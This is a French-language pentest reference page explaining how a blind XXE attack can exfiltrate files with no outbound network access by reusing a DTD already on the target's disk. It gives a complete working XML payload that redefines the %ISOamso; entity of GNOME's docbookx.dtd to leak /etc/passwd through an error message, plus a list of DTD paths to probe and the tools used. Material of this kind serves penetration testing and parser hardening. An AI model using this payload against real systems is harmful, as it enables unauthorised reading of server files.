---
title: "Réutilisation de DTD locale pour un XXE aveugle sans sortie"
description: "Réutiliser un fichier DTD déjà présent sur le disque permet à un XXE aveugle de redéfinir une entité interne et de déclencher une fuite basée sur les erreurs quand le réseau sortant est bloqué."
keywords:
  - DTD locale
  - XXE aveugle
  - aucun réseau sortant
  - redéfinition d'entité
  - fuite basée sur les erreurs
---

# DTD locale

Les techniques aveugles portables récupèrent une DTD externe depuis un serveur de l'attaquant. Quand l'accès réseau sortant est entièrement bloqué, ni HTTP ni FTP, et que le sous-ensemble interne interdit l'astuce de l'entité-paramètre-dans-déclaration-de-balisage dont l'attaquant a besoin, ces approches calent. La technique en **DTD locale** supprime l'exigence réseau en réutilisant un fichier DTD qui existe déjà sur le propre système de fichiers de la cible.

## L'idée

La plupart des systèmes livrent des fichiers DTD dans le cadre de paquets installés : les chaînes d'outils de documentation, GNOME, les distributions Linux et les runtimes d'application déposent tous des fichiers `.dtd` sur le disque. Un exemple bien connu est la DTD DocBook à `/usr/share/yelp/dtd/docbookx.dtd`, présente sur de nombreuses installations GNOME. Ces fichiers déclarent des entités paramètres en interne. L'attaque charge l'un d'eux avec une référence `SYSTEM "file://..."`, qui est une lecture purement locale, puis **redéfinit** l'une des entités paramètres qu'il déclare.

XML permet de redéfinir une entité paramètre, et la première définition l'emporte ; en déclarant l'entité cible avant d'invoquer la DTD locale, la valeur de l'attaquant prend effet tandis que le reste de la DTD locale se parse normalement. Choisissez une entité paramètre que la DTD locale référence quelque part, et détournez-la pour porter la fuite basée sur les erreurs.

## Exemple de charge utile

`docbookx.dtd` déclare en interne, entre autres, une entité paramètre utilisée dans son modèle de contenu. Le document injecté charge le fichier et redéfinit cette entité de sorte que sa résolution lise le fichier cible et l'alimente dans un chemin invalide :

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
  <!ENTITY % ISOamso '
    <!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
    <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM
      &#x27;file:///nonexistent/&#x25;file;&#x27;>">
    &#x25;eval;
    &#x25;error;
  '>
  %local_dtd;
]>
<foo>bar</foo>
```

Le flux : `%local_dtd;` intègre la DTD DocBook sur disque, qui référence en interne `%ISOamso;`. Parce que l'attaquant a déclaré `%ISOamso;` en premier, la version redéfinie s'exécute. À l'intérieur, `%file;` lit `/etc/passwd`, `%eval;` construit `%error;` comme une référence vers un chemin inexistant avec le contenu du fichier ajouté, et résoudre `%error;` lève une erreur de parsing dont le message porte le fichier. Les références numériques (`&#x25;` pour `%`, `&#x26;#x25;` pour un `%` échappé, `&#x27;` pour un guillemet) gardent les déclarations imbriquées bien formées pour que chaque couche soit définie au bon moment.

## Trouver une DTD utilisable

La technique a besoin d'une DTD présente sur le disque et dont les entités paramètres internes peuvent être redéfinies vers la chaîne de fuite. Les candidats varient selon la plateforme ; sondez celles susceptibles d'exister :

```
file:///usr/share/yelp/dtd/docbookx.dtd        # GNOME / yelp, entity %ISOamso;
file:///usr/share/xml/fontconfig/fonts.dtd     # fontconfig
file:///usr/share/xml/scrollkeeper/dtds/scrollkeeper-omf.dtd
```

Sur les piles Windows et Java, les répertoires de runtime et d'application contiennent leurs propres DTD. Confirmez d'abord qu'un fichier existe avec une simple lecture locale qui réussit ou échoue de façon distinguable, puis faites correspondre le nom de l'entité redéfinie à l'une que la DTD choisie déclare et référence effectivement. Une fois une DTD présente et un nom d'entité valide trouvés, la fuite se déroule sans aucune connexion sortante.

## Outils

- **dtd-finder (GoSecure)** : lister les DTD sur disque et générer des charges utiles en DTD locale.
- **Burp Repeater** : itérer les chemins de DTD candidats et les noms d'entités.
- Tests manuels avec une charge utile de redéfinition en DTD locale pour les cibles sans sortie.

## Références

- [OWASP: XML External Entity (XXE) Processing](https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing)
- [PayloadsAllTheThings: XXE Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection)
